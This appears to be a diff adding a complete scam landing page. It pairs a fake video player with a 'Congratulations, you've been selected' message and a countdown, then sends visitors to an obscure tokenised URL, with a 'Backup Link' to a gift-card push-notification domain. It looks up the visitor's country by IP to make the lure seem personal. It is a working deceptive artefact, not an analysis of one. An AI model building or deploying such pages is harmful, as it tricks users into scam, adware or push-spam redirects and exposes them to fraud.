@@ -1,0 +1,86 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>🎁 Exclusive Access — Limited Offer</title>
+<meta name="robots" content="noindex,nofollow">
+<style>
+:root{
+  --bg:#0b0d17;--card:#111827;--txt:#f9fafb;--muted:#9ca3af;
+  --a:#3b82f6;--b:#2563eb;--border:rgba(255,255,255,.08)
+}
+*{box-sizing:border-box;margin:0;padding:0;font-family:system-ui,Arial}
+body{
+  background:radial-gradient(900px 600px at 70% -20%,#1e3a8a 0%,#0b0d17 60%,#0b0d17 100%);
+  color:var(--txt);display:flex;flex-direction:column;align-items:center;
+  justify-content:center;min-height:100vh;text-align:center;padding:20px
+}
+.card{
+  background:var(--card);border:1px solid var(--border);border-radius:20px;
+  max-width:420px;width:100%;padding:28px 24px;box-shadow:0 0 20px rgba(0,0,0,.4)
+}
+h1{font-size:1.45rem;margin-bottom:8px}
+p{color:var(--muted);margin-bottom:18px;font-size:.95rem}
+.fake{
+  width:100%;height:210px;border-radius:12px;border:1px solid var(--border);
+  background:radial-gradient(120% 100% at 80% 0%, #1f2937 0%, #0b0d17 60%);
+  position:relative;margin-bottom:18px
+}
+.play{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
+  background:rgba(255,255,255,.12);border:3px solid #fff;border-radius:50%;
+  width:70px;height:70px;display:flex;align-items:center;justify-content:center}
+.play::before{content:'';border-style:solid;border-width:12px 0 12px 18px;
+  border-color:transparent transparent transparent #fff;margin-left:4px}
+.count{font-weight:700;color:var(--a);margin-bottom:8px}
+button{
+  width:100%;padding:14px 0;border:none;border-radius:12px;
+  background:linear-gradient(90deg,var(--a),var(--b));color:#fff;
+  font-weight:800;font-size:1.05rem;cursor:pointer;transition:transform .1s
+}
+button:active{transform:scale(.96)}
+.note{font-size:.9rem;color:var(--muted);margin-top:12px}
+footer{margin-top:24px;font-size:.8rem;color:var(--muted)}
+</style>
+</head>
+<body>
+<div class="card">
+  <h1 id="headline">🎁 Congratulations!</h1>
+  <p id="subtitle">You’ve been selected for today’s exclusive access.</p>
+
+  <div class="fake"><div class="play"></div></div>
+
+  <div class="count">Unlocking in <span id="t">5</span> seconds…</div>
+  <button id="btn" disabled>Preparing access...</button>
+  <div class="note">If it doesn’t open, try again 👇<br>
+    <a href="#" id="backup" style="color:#facc15;font-weight:700;">Backup Link</a>
+  </div>
+</div>
+
+<footer>©2025 Universal Gateway | Promotional Access</footer>
+
+<script>
+const PRIMARY_URL="https://moundconclusive.com/qng7ic9mmn?key=7aafa190a2f78bc6cb6fd084e1fa9c4c";
+const BACKUP_URL="https://giftcardzoneeu.com/PushOne/";
+let t=5;
+const timer=document.getElementById("t"),btn=document.getElementById("btn");
+const tick=setInterval(()=>{t--;timer.textContent=t;
+  if(t<=0){clearInterval(tick);btn.disabled=false;btn.textContent="👉 Continue";}
+},1000);
+btn.onclick=()=>location.href=PRIMARY_URL;
+document.getElementById("backup").onclick=e=>{e.preventDefault();location.href=BACKUP_URL;};
+
+// 🌍 GEO personalize (simple lookup)
+fetch("https://ipapi.co/json/")
+  .then(r=>r.json())
+  .then(d=>{
+    const c=d.country_name||"your country";
+    const f=d.country_code||"";
+    const flag = f ? `https://flagcdn.com/24x18/${f.toLowerCase()}.png` : "";
+    const sub=document.getElementById("subtitle");
+    sub.innerHTML=`Now trending in <b>${c}</b> ${flag ? `<img src="${flag}" alt="${f}" style="vertical-align:middle;border-radius:3px">`:''}`;
+  })
+  .catch(()=>{});
+</script>
+</body>
+</html>
